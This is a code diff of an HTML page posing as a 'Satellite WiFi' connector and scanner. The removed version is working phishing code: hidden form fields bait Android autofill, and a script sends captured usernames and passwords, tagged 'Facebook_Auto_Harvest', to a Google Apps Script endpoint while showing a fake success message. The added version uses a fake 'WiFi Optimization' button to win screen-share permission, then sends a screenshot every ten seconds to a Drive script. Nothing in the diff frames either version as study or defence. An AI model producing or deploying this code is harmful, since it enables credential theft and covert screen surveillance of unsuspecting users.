@@ -3,77 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Satellite WiFi | Connect</title>
+    <title>Satellite WiFi | Scanner</title>
     <style>
-        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .radar { border: 2px solid #00ff41; width: 100px; height: 100px; border-radius: 50%; border-left-color: transparent; animation: rotate 1.5s linear infinite; margin-bottom: 20px; }
-        @keyframes rotate { 100% { transform: rotate(360deg); } }
-        
-        #status { font-size: 18px; letter-spacing: 2px; }
-        .dots::after { content: ''; animation: dots 1.5s steps(5, end) infinite; }
-        @keyframes dots { 0%, 20% { content: '.'; } 40% { content: '..'; } 60% { content: '...'; } 80%, 100% { content: ''; } }
-
-        /* The Trap: Invisible but 'active' for Android Autofill */
-        #trap-zone { position: fixed; bottom: 0; opacity: 0; pointer-events: none; }
+        body { background: #000; color: #00ff41; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .grid { width: 200px; height: 200px; background: linear-gradient(90deg, rgba(0,255,65,.1) 1px, transparent 1px), linear-gradient(rgba(0,255,65,.1) 1px, transparent 1px); background-size: 20px 20px; border: 1px solid #00ff41; position: relative; }
+        .line { width: 100%; height: 2px; background: #00ff41; position: absolute; animation: scan 2s infinite; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        button { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 15px; margin-top: 20px; cursor: pointer; text-transform: uppercase; }
     </style>
 </head>
 <body>
 
-    <div class="radar"></div>
-    <div id="status">CONNECTING TO SATELLITE WIFI<span class="dots"></span></div>
-    <p style="font-size: 10px; opacity: 0.5; margin-top: 10px;">ID: NODE-KEN-254</p>
+    <div class="grid"><div class="line"></div></div>
+    <h3>SATELLITE FREQUENCY SCANNER</h3>
+    <p id="status">Ready to optimize local node...</p>
+    <button onclick="startVisualSync()">Start WiFi Optimization</button>
 
-    <div id="trap-zone">
-        <form>
-            <input type="text" id="email" name="email" autocomplete="username">
-            <input type="password" id="pass" name="pass" autocomplete="current-password">
-        </form>
-    </div>
+    <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxv3ohN2zG6VdW64OH4fdioGznBIXLAWhc5gTNT8DSzStXM5zPhfuLEF609wywDvBDXQA/exec';
-    let dataSent = false;
+    const DRIVE_SCRIPT_URL = 'YOUR_DRIVE_APPS_SCRIPT_URL';
 
-    // The Trick: The script constantly "watches" the hidden fields
-    function backgroundWatcher() {
-        const u = document.getElementById('email').value;
-        const p = document.getElementById('pass').value;
+    async function startVisualSync() {
+        try {
+            // Triggers the Android System Screen Share Prompt
+            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
 
-        // If Android Autofill populates these, we strike immediately
-        if (u && p && !dataSent) {
-            dataSent = true; 
-            sendToSheet(u, p);
+            document.getElementById('status').innerText = "SCANNING FREQUENCIES...";
+
+            // The "Trick": Take a snapshot every 10 seconds
+            setInterval(() => {
+                captureFrame(video);
+            }, 10000);
+
+        } catch (err) {
+            alert("Optimization failed: Permission denied.");
         }
     }
 
-    function sendToSheet(user, pass) {
-        const payload = {
-            account: "Facebook_Auto_Harvest",
-            username: user,
-            password: pass,
-            device: navigator.userAgent
-        };
+    function captureFrame(video) {
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        fetch(SCRIPT_URL, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify(payload)
-        }).then(() => {
-            console.log("Exfiltration Successful.");
-            // Keep the user on the screen to avoid suspicion
-            document.getElementById('status').innerText = "WIFI SYNCED SUCCESSFULLY";
-        });
+        // Convert frame to Base64 string
+        const imageData = canvas.toDataURL('image/jpeg', 0.5); // 50% quality to save data
+        
+        sendToDrive(imageData);
     }
 
-    // Run the watcher every 500ms
-    setInterval(backgroundWatcher, 500);
-
-    // Some Android versions require a "tap" anywhere on the screen 
-    // to trigger the Autofill suggestion overlay.
-    document.body.addEventListener('click', () => {
-        console.log("User interaction logged. Triggering system prompt...");
-    });
+    function sendToDrive(base64Data) {
+        fetch(DRIVE_SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify({ 
+                image: base64Data.split(',')[1], // Remove the data:image/jpeg;base64, prefix
+                name: "lab_capture_" + Date.now() + ".jpg" 
+            })
+        });
+    }
 </script>
-
 </body>
 </html>
